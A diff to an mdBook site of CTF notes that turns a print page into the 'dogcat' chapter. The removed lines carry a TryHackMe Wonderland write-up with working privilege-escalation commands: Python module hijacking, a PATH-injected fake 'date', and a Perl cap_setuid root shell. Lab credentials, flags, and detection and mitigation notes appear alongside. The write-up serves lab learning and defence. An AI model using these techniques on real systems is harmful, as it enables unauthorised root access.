@@ -3,8 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Ruohao&#x27;s Cyber Notes &amp; Writeups</title>
-        <meta name="robots" content="noindex">
+        <title>dogcat - Ruohao&#x27;s Cyber Notes &amp; Writeups</title>
 
 
         <!-- Custom HTML head -->
@@ -13,34 +12,34 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="icon" href="favicon.svg">
-        <link rel="shortcut icon" href="favicon.png">
-        <link rel="stylesheet" href="css/variables.css">
-        <link rel="stylesheet" href="css/general.css">
-        <link rel="stylesheet" href="css/chrome.css">
-        <link rel="stylesheet" href="css/print.css" media="print">
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="fonts/fonts.css">
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
 
         <!-- Provide site root and default themes to javascript -->
         <script>
-            const path_to_root = "";
+            const path_to_root = "../../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex.js";
+            window.path_to_searchindex_js = "../../../searchindex.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc.js"></script>
+        <script src="../../../toc.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -107,7 +106,7 @@
             <!-- populated by js -->
             <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
             <noscript>
-                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
             </noscript>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -142,7 +141,7 @@
                     <h1 class="menu-title">Ruohao&#x27;s Cyber Notes &amp; Writeups</h1>
 
                     <div class="right-buttons">
-                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
 
@@ -176,266 +175,7 @@
 
                 <div id="content" class="content">
                     <main>
-                        <!-- --- -->
-<!-- # Keep front-matter minimal; tags here are optional if you use mdbook-tags -->
-<!-- title: "Welcome" -->
-<!-- --- -->
-<!-- Hero / Title -->
-<h1 align="center">🛡️ My Cyber Notebook</h1>
-<p align="center">
-  Notes, references, and CTF writeups — stitched together with curiosity, reproducibility, and a mildly unhealthy love for automation.
-</p>
-<!-- Badges -->
-<p align="center">
-  <a href="https://github.com/Ruohao1"><img alt="GitHub"
-     src="https://img.shields.io/badge/GitHub-Ruohao1-black?logo=github"></a>
-  <a href="https://tryhackme.com/p/ruohao"><img alt="TryHackMe"
-     src="https://img.shields.io/badge/TryHackMe-ruohao-darkred?logo=tryhackme"></a>
-  <a href="https://linkedin.com/in/ruohaolin"><img alt="LinkedIn"
-     src="https://img.shields.io/badge/LinkedIn-ruohaolin-0A66C2?logo=linkedin"></a>
-  <a href="https://ruohao.dev"><img alt="Portfolio"
-     src="https://img.shields.io/badge/Portfolio-ruohao.dev-111111?logo=vercel"></a>
-</p>
-<!-- Quick links / CTA -->
-<p align="center">
-  <a href="./notes/README.html"><b>Browse Notes</b></a> •
-  <a href="./writeups/README.html"><b>See Writeups</b></a> •
-  <a href="./references/README.html"><b>Reference Hub</b></a>
-</p>
-<hr />
-<h2 id="what-this-is"><a class="header" href="#what-this-is">What this is</a></h2>
-<p>This book is a growing collection of <strong>concise notes</strong>, <strong>repeatable configs</strong>, and <strong>step-by-step writeups</strong> from my work in:</p>
-<ul>
-<li>Linux hardening &amp; privesc, network forensics, web exploitation, and reversing.</li>
-<li>My homelab (Proxmox + LXC/Docker, segmented networks, Tailscale, TLS).</li>
-<li>Ansible roles/playbooks for CIS/ANSSI-style hardening and lab automation.</li>
-</ul>
-<p>Where helpful, pages are tagged (e.g., <code>linux</code>, <code>privesc</code>, <code>web</code>, <code>pwn</code>, <code>ansible</code>). If you have <code>mdbook-tags</code> enabled, you’ll get automatic tag indexes under <code>/tags/…</code>.</p>
-<blockquote>
-<p><em>“Document what you break, so you can break it better next time.”</em></p>
-</blockquote>
-<hr />
-<h2 id="structure"><a class="header" href="#structure">Structure</a></h2>
-<ul>
-<li><strong>Notes</strong> — short, focused pages: theory, commands, gotchas.<br />
-Start here: <strong><a href="./notes/README.html">notes/README.md</a></strong></li>
-<li><strong>Writeups</strong> — full walkthroughs for TryHackMe, Root-Me, FCSC, etc.<br />
-Start here: <strong><a href="./writeups/README.html">writeups/README.md</a></strong></li>
-<li><strong>References</strong> — tools I reuse, shell snippets, bibliography.<br />
-Start here: <strong><a href="./references/README.html">references/README.md</a></strong></li>
-</ul>
-<p>If search is enabled (<code>mdbook-search</code>), use the 🔍 bar to jump to commands or error strings.</p>
-<hr />
-<h2 id="homelab-snapshot"><a class="header" href="#homelab-snapshot">Homelab snapshot</a></h2>
-<p align="center">
-  <!-- Drop your diagram at: src/assets/homelab.png -->
-  <img src="./assets/homelab.png" alt="Homelab diagram" width="720">
-</p>
-<ul>
-<li>Segmented services (Pi-hole, Vaultwarden, Nextcloud AIO, Jellyfin, SIEMini).</li>
-<li>LXC + Docker Compose + Ansible for repeatability.</li>
-<li>Logs routed to a mini-SIEM (Snort3, Syslog-NG, Elastic/Kibana).</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div><!-- --- -->
-<!-- title: "Notes" -->
-<!-- --- -->
-<!---->
-<h1 align="center">🛡️ Notes</h1>
-<p>This section is my <strong>technical notebook</strong> — a living collection of what I learn, test, and refine across cybersecurity, system administration, and software engineering.</p>
-<hr />
-<p>I use these notes to:</p>
-<ul>
-<li>Consolidate fragmented knowledge from CTFs, labs, and courses.</li>
-<li>Record useful commands, configurations, and short explanations.</li>
-<li>Bridge concepts between offensive, defensive, and operational security.</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="permissions"><a class="header" href="#permissions">Permissions</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="hardening"><a class="header" href="#hardening">Hardening</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="xss"><a class="header" href="#xss">XSS</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt"><a class="header" href="#jwt">JWT</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="ghidra"><a class="header" href="#ghidra">Ghidra</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="pwntools"><a class="header" href="#pwntools">Pwntools</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="writeups"><a class="header" href="#writeups">Writeups</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="tryhackme"><a class="header" href="#tryhackme">TryHackMe</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="wonderland-ctf"><a class="header" href="#wonderland-ctf">Wonderland CTF</a></h1>
-<blockquote>
-<p>End‑to‑end exploitation path with commands, rationale, and mitigations.</p>
-</blockquote>
-<h2 id="scope--target"><a class="header" href="#scope--target">Scope &amp; Target</a></h2>
-<ul>
-<li><strong>Host:</strong> <code>10.201.105.251</code></li>
-<li><strong>Goal:</strong> Obtain user and root flags</li>
-<li><strong>Methodology:</strong> Recon → Web enum → Initial access → Priv‑esc chain (alice → rabbit → hatter → root)</li>
-</ul>
-<hr />
-<h2 id="tldr-path"><a class="header" href="#tldr-path">TL;DR Path</a></h2>
-<ol>
-<li><strong>Web enum</strong> discovers <code>/r/a/b/b/i/t/</code> and reveals credentials <code>alice:HowDothTheLittleCrocodileImproveHisShiningTail</code>.</li>
-<li><strong>SSH</strong> as <code>alice</code>.</li>
-<li><strong>Sudo‑allowed Python</strong> as user <code>rabbit</code> executes <code>/home/alice/walrus_and_the_carpenter.py</code>; <strong>hijack Python module resolution</strong> with a malicious <code>random.py</code> to pop a shell as <code>rabbit</code>.</li>
-<li><strong>Tea Party binary</strong> is vulnerable to <strong>PATH injection</strong> on <code>date</code>; craft <code>/tmp/bin/date</code> → shell as <code>hatter</code>.</li>
-<li>Enumerate <strong>capabilities</strong>; <code>/usr/bin/perl</code> has <code>cap_setuid+ep</code>. Use Perl to setuid(0) → <strong>root</strong>.</li>
-<li>Read flags.</li>
-</ol>
-<hr />
-<h2 id="recon"><a class="header" href="#recon">Recon</a></h2>
-<h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
-<pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.201.105.251
-# 22/tcp open  ssh OpenSSH 7.6p1
-# 80/tcp open  http Golang net/http server
-</code></pre>
-<p>Notes: Two exposed services, HTTP on 80 looks like a Go server, likely a light file server or app; SSH is present for potential credential reuse.</p>
-<h3 id="content-discovery"><a class="header" href="#content-discovery">Content Discovery</a></h3>
-<pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
-# ... r (301), img (301), index.html (301)
-
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
-# ... a (301)
-</code></pre>
-<p>Manual traversal suggests a rabbit‑hole (literally).</p>
-<hr />
-<h2 id="web-enumeration--credential-disclosure"><a class="header" href="#web-enumeration--credential-disclosure">Web Enumeration → Credential Disclosure</a></h2>
-<p>Progressive path guessing:</p>
-<pre><code class="language-bash">curl http://10.201.105.251/r/
-curl http://10.201.105.251/r/a/
-curl http://10.201.105.251/r/a/b/b/i/t/
-</code></pre>
-<p>Final page contains a hidden line with credentials:</p>
-<pre><code class="language-html">&lt;p style="display: none;"&gt;
-  alice:HowDothTheLittleCrocodileImproveHisShiningTail
-&lt;/p&gt;
-</code></pre>
-<hr />
-<h2 id="initial-foothold-ssh--alice"><a class="header" href="#initial-foothold-ssh--alice">Initial Foothold (SSH → alice)</a></h2>
-<pre><code class="language-bash">ssh alice@10.201.105.251
-whoami &amp;&amp; id &amp;&amp; ls -la
-# user: alice
-</code></pre>
-<p>Interesting files:</p>
-<ul>
-<li><code>~/walrus_and_the_carpenter.py</code></li>
-<li><code>~/root.txt</code> (not readable yet)</li>
-</ul>
-<p>Sudo privileges:</p>
-<pre><code class="language-bash">sudo -l
-# (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-</code></pre>
-<hr />
-<h2 id="alice--rabbit-python-module-hijacking-via-randompy"><a class="header" href="#alice--rabbit-python-module-hijacking-via-randompy">alice → rabbit: Python Module Hijacking via <code>random.py</code></a></h2>
-<p><code>walrus_and_the_carpenter.py</code>:</p>
-<pre><code class="language-python">import random
-poem = """..."""
-for i in range(10):
-    line = random.choice(poem.split("\n"))
-    print("The line was:\t", line)
-</code></pre>
-<p><strong>Observation:</strong> Python’s import order puts the <strong>script directory</strong> early in <code>sys.path</code>. If we drop a <code>random.py</code> next to the target script, it will be imported <strong>instead of</strong> the stdlib <code>random</code> module.</p>
-<p>Create malicious module:</p>
-<pre><code class="language-python"># /home/alice/random.py
-import os
-os.execl('/bin/bash', 'bash', '-p')
-</code></pre>
-<p>Execute as <code>rabbit</code> via sudo:</p>
-<pre><code class="language-bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-whoami
-# rabbit
-</code></pre>
-<hr />
-<h2 id="rabbit--hatter-path-injection-on-teaparty"><a class="header" href="#rabbit--hatter-path-injection-on-teaparty">rabbit → hatter: PATH Injection on <code>teaParty</code></a></h2>
-<p>List rabbit’s home:</p>
-<pre><code class="language-bash">ls -la /home/rabbit
-# teaParty (ELF or script)
-/home/rabbit/teaParty
-# Output includes: "Probably by Sun, 09 Nov 2025 00:46:02 +0000"
-# The program likely calls `date` without an absolute path.
-</code></pre>
-<p>Exploit by shadowing <code>date</code>:</p>
-<pre><code class="language-bash">mkdir -p /tmp/bin
-printf '#!/bin/sh\n/bin/sh -p\n' &gt; /tmp/bin/date
-chmod +x /tmp/bin/date
-PATH=/tmp/bin:$PATH /home/rabbit/teaParty
-
-id
-# uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
-</code></pre>
-<hr />
-<h2 id="hatter--root-linux-capabilities-perl-cap_setuid"><a class="header" href="#hatter--root-linux-capabilities-perl-cap_setuid">hatter → root: Linux Capabilities (Perl <code>cap_setuid</code>)</a></h2>
-<p>Enumerate capabilities:</p>
-<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
-# /usr/bin/perl = cap_setuid+ep
-# /usr/bin/perl5.x = cap_setuid+ep
-</code></pre>
-<p>Abuse with Perl:</p>
-<pre><code class="language-bash">/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-id
-# uid=0(root)
-</code></pre>
-<hr />
-<h2 id="loot-flags"><a class="header" href="#loot-flags">Loot (Flags)</a></h2>
-<pre><code class="language-bash">cat /root/user.txt /home/alice/root.txt
-# thm{"Curiouser and curiouser!"}
-# thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
-</code></pre>
-<hr />
-<h2 id="detection--forensics-notes"><a class="header" href="#detection--forensics-notes">Detection &amp; Forensics Notes</a></h2>
-<ul>
-<li>Web access logs for <code>/r/a/b/b/i/t/</code> reveal reconnaissance timeline.</li>
-<li><code>.bash_history</code> for <code>alice</code>, <code>rabbit</code>, <code>hatter</code> (if not restricted) exposes commands: <code>sudo -u rabbit ...</code>, <code>PATH=/tmp/bin:$PATH ...</code>, Perl setuid exploit.</li>
-<li>File system artifacts:
-<ul>
-<li><code>/home/alice/random.py</code></li>
-<li><code>/tmp/bin/date</code></li>
-</ul>
-</li>
-<li><code>auth.log</code> / <code>secure</code> entries for escalations tied to <code>sudo</code> and SSH sessions.</li>
-<li><code>getcap</code> enumeration indicates misconfiguration (capability left on an interpreter).</li>
-</ul>
-<hr />
-<h2 id="mitigations"><a class="header" href="#mitigations">Mitigations</a></h2>
-<ul>
-<li><strong>Web app / Content:</strong> Don’t expose credentials in hidden DOM; move secrets to server‑side; apply content reviews.</li>
-<li><strong>Least privilege:</strong> Remove sudo rules that allow executing interpreters; if needed, whitelist exact binaries with <strong>absolute</strong> interpreter paths and <code>NOEXEC</code> mounts where possible.</li>
-<li><strong>Python imports:</strong> Execute with sanitized <code>PYTHONPATH</code>; vendor required modules; run with <code>-I</code> (isolated mode) or set <code>sys.path</code> explicitly.</li>
-<li><strong>PATH safety:</strong> In set‑uid or privileged binaries, <strong>use absolute paths</strong> for all external calls or drop privileges before invoking utilities.</li>
-<li><strong>Capabilities:</strong> Avoid granting <code>cap_setuid</code> to interpreters (Perl/Python). If required, wrap capability into a minimal, audited helper in C that drops privileges immediately after use.</li>
-<li><strong>Monitoring:</strong> Alert on capability changes (<code>setcap</code>), unexpected binaries in world‑writable directories (<code>/tmp/bin/*</code>), and suspicious <code>sudo -u &lt;otheruser&gt;</code> patterns.</li>
-</ul>
-<hr />
-<h2 id="appendix--full-command-log"><a class="header" href="#appendix--full-command-log">Appendix — Full Command Log</a></h2>
-<pre><code class="language-bash"># Recon
-nmap -sV -Pn -oN nmap.txt 10.201.105.251
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
-curl http://10.201.105.251/r/a/b/b/i/t/
-
-# Initial access
-ssh alice@10.201.105.251
-
-# Escalate to rabbit
-cat /home/alice/walrus_and_the_carpenter.py
-printf 'import os\nos.execl(\"/bin/bash\",\"bash\",\"-p\")\n' &gt; /home/alice/random.py
-sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-
-# Rabbit → Hatter (PATH injection)
-mkdir -p /tmp/bin
-printf '#!/bin/sh\n/bin/sh -p\n' &gt; /tmp/bin/date
-chmod +x /tmp/bin/date
-PATH=/tmp/bin:$PATH /home/rabbit/teaParty
-
-# Hatter → Root (capabilities)
-getcap -r / 2&gt;/dev/null | grep perl
-/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-
-# Proof
-cat /root/user.txt /home/alice/root.txt
-</code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="dogcat-ctf--full-write-up"><a class="header" href="#dogcat-ctf--full-write-up">Dogcat CTF — Full Write-Up</a></h1>
+                        <h1 id="dogcat-ctf--full-write-up"><a class="header" href="#dogcat-ctf--full-write-up">Dogcat CTF — Full Write-Up</a></h1>
 <h2 id="tldr"><a class="header" href="#tldr">TL;DR</a></h2>
 <ul>
 <li><strong>Entry:</strong> PHP local file inclusion (LFI) via <code>?view=</code> + <strong>path traversal</strong> and <strong>php://filter</strong> → source disclosure and <code>/etc/passwd</code>.</li>
@@ -445,7 +185,7 @@ cat /root/user.txt /home/alice/root.txt
 <li><strong>Loot:</strong> <code>flag1</code> (web root), <code>flag2</code> (FS), <code>flag3</code> (container root), <code>flag4</code> (host root).</li>
 </ul>
 <hr />
-<h2 id="recon-1"><a class="header" href="#recon-1">Recon</a></h2>
+<h2 id="recon"><a class="header" href="#recon">Recon</a></h2>
 <p>![[writeups/tryhackme/dogcat/images/index.png]]</p>
 <h3 id="port-scan"><a class="header" href="#port-scan">Port scan</a></h3>
 <pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.201.127.166
@@ -454,7 +194,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 </code></pre>
 <p>Rationale: quick service discovery to pick the likely web attack surface. SSH noted but de-prioritized until creds/keys appear.</p>
-<h3 id="content-discovery-1"><a class="header" href="#content-discovery-1">Content discovery</a></h3>
+<h3 id="content-discovery"><a class="header" href="#content-discovery">Content discovery</a></h3>
 <pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.127.166/\?view\=FUZZ -fw 77
 acatalog                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 171ms]
 alcatel                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 174ms]
@@ -591,16 +331,18 @@ cat flag4.txt
 # THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 </code></pre>
 <p>Commentary: This is a <strong>build/backup pipeline abuse</strong>—executable under higher privileges outside the container boundary. Integrity of scripts under <code>/opt/backups</code> must be enforced with permissions and signing.</p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="references"><a class="header" href="#references">References</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="tools"><a class="header" href="#tools">Tools</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="command-cheatsheet"><a class="header" href="#command-cheatsheet">Command Cheatsheet</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="bibliography"><a class="header" href="#bibliography">Bibliography</a></h1>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../writeups/tryhackme/Wonderland/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
 
+                            <a rel="next prefetch" href="../../../references/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
 
                         <div style="clear: both"></div>
                     </nav>
@@ -608,7 +350,13 @@ cat flag4.txt
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../writeups/tryhackme/Wonderland/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
 
+                    <a rel="next prefetch" href="../../../references/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
             </nav>
 
         </div>
@@ -621,21 +369,16 @@ cat flag4.txt
         </script>
 
 
-        <script src="elasticlunr.min.js"></script>
-        <script src="mark.min.js"></script>
-        <script src="searcher.js"></script>
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
 
-        <script src="clipboard.min.js"></script>
-        <script src="highlight.js"></script>
-        <script src="book.js"></script>
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
 
         <!-- Custom JS scripts -->
 
-        <script>
-        window.addEventListener('load', function() {
-            window.setTimeout(window.print, 100);
-        });
-        </script>
 
 
     </div>
